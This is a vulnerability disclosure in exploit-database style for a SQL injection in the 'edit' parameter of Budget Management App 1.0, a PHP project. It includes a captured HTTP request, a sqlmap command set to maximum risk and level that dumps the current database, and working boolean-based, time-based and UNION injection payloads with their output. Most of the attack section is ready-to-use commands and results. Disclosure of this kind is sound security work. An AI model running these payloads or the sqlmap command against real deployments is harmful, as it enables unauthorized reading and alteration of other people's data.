# Budget Management App - SQL Injection - 1
+ **Exploit Title:** Budget Management App - SQL Injection - 1
+ **Date:** 2024-12-05
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://code-projects.org/budget-management-in-php-with-source-code/
+ **Software Link:** https://download.code-projects.org/details/1c10fce2-3260-479b-878f-b2107dec72f9
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Budget Management App 1.0 allows SQL Injection via the 'edit' parameter at "http://localhost//PHP-Budget-Calculator/index.php?edit=2. 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/PHP-Budget-Calculator/index.php"
+ Click edit button.
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /PHP-Budget-Calculator/index.php?edit=2 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```

+ Use sqlmap to exploit. In sqlmap, use 'edit' parameter to dump the database.
```
sqlmap -r r.txt -p edit --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: edit (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: edit=2 AND 4090=(SELECT (CASE WHEN (4090=4090) THEN 4090 ELSE (SELECT 3329 UNION SELECT 9133) END))-- -

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: edit=2 AND (SELECT 8766 FROM (SELECT(SLEEP(5)))zPTF)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: edit=2 UNION ALL SELECT NULL,NULL,CONCAT(0x7171716a71,0x74747458684b75667677586a435954536c7656734b695759664c6e41596b547443636e68504d6c52,0x7176766a71)-- -
---
[10:58:08] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:58:08] [INFO] fetching current database
current database: 'budget_calculator'

```
+ current database: `budget_calculator`

![Ekran görüntüsü 2024-05-15 224958](https://github.com/BurakSevben/CVEs/assets/117217689/b95e7696-00c0-4a21-841c-286243317372)
